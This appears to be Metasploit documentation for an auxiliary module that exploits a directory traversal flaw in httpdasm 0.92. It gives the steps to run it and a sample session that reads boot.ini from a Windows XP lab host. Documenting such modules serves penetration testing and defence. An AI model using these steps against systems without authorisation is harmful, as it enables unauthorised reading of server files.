## Description

  This module exploits a directory traversal vulnerability to read files from a server running httpdasm v0.92.

## Vulnerable Application

  httpdasm 0.92

## Verification Steps

  1. Start `msfconsole`
  2. `use [auxiliary/scanner/http/httpdasm_directory_traversal]`
  3. `set RHOSTS [IP]`
  4. `run`

## Scenarios

### Tested on Windows XP x86

  ```
  msf5 > use auxiliary/scanner/http/httpdasm_directory_traversal
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > set rhosts 192.168.37.128
  rhosts => 192.168.37.128
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > run

  [boot loader]
  timeout=30
  default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
  [operating systems]
  multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect

  [*] Auxiliary module execution completed
  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) >
  ```
